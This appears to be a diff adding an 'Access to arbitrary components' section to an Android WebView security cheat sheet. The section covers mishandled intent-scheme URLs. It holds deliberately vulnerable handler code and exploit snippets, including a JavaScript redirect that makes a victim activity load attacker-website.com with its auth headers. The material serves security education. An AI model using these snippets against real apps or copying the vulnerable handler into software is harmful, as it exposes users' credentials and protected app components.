@@ -4,6 +4,56 @@
 
 # Security issues
 
+## Access to arbitrary components
+
+The Intent class allows developers to convert an intent to a string holding a URI representation of it with the [toUri(flags)](https://developer.android.com/reference/android/content/Intent#toUri(int)) method and create an intent from this URI with the [parseUri(stringUri, flags)](https://developer.android.com/reference/android/content/Intent#parseUri(java.lang.String,%20int)) method. An app can use this to parse a URL with the `intent` scheme into intent and launch an activity while handling the URL within the WebView. If the handling is not implemented correctly, you can access arbitrary components of the app.
+
+{% embed url="https://0xn3va.gitbook.io/cheat-sheets/android-application/intent#access-to-arbitrary-components" %}
+
+Developers can override the [shouldOverrideUrlLoading()](https://developer.android.com/reference/android/webkit/WebViewClient#shouldOverrideUrlLoading(android.webkit.WebView,%20android.webkit.WebResourceRequest)) method of the WebViewClient class to handle all efforts to load a new link within WebView. The example of mishandling might look as follows:
+
+```java
+public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
+    Uri uri = request.getUrl();
+    if ("intent".equals(uri.getScheme())) {
+        startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
+        return true;
+    }
+    return super.shouldOverrideUrlLoading(view, request);
+}
+```
+
+This code adds a custom handler for URLs with the `intent` scheme that launch a new activity using the passed URL. You can exploit this mishandling by creating a WebView and redirecting it to a specially crafted `intent-scheme` URL:
+
+```java
+// Intent-scheme URL creation
+Intent intent = new Intent();
+intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
+intent.putExtra("url", "http://attacker-website.com/");
+String url = intent.toUri(Intent.URI_INTENT_SCHEME);
+// "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fattacker-website.com%2F;end"
+Log.d("evil", url);
+```
+
+```java
+// AuthWebViewActivity
+webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
+```
+
+```javascript
+// Redirect within WebView
+location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fattacker-website.com%2F;end";
+```
+
+However, there are several restrictions:
+
+- Intent embedded `Parcelable` and `Serializable` objects cannot be converted to string and these objects will be ignored.
+- The [Intent.parseUri(stringUri, flags)](https://developer.android.com/reference/android/content/Intent#parseUri(java.lang.String,%20int)) ignores the [Intent.FLAG_GRANT_READ_URI_PERMISSION](https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_READ_URI_PERMISSION) and [Intent.FLAG_GRANT_WRITE_URI_PERMISSION](https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_WRITE_URI_PERMISSION) flags by default. The parser leaves them only if the [Intent.URI_ALLOW_UNSAFE](https://developer.android.com/reference/android/content/Intent#URI_ALLOW_UNSAFE) flag is set.
+
+    ```java
+    startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE)
+    ```
+
 ## addJavascriptInterface
 
 [addJavascriptInterface](https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29) method injects the supplied Java object into this WebView. The object is injected into all frames of the web page, including all the `iframes`, using the supplied name. This allows the Java object's methods to be accessed from JavaScript (the Java object's fields are not accessible).
@@ -60,3 +110,7 @@ Enabling this flag allows you to execute arbitrary JavaScript code within any We
 
 References:
 - [Remote debugging WebViews](https://developer.chrome.com/docs/devtools/remote-debugging/webviews/)
+
+# References
+
+- [Oversecured: Android Access to app protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
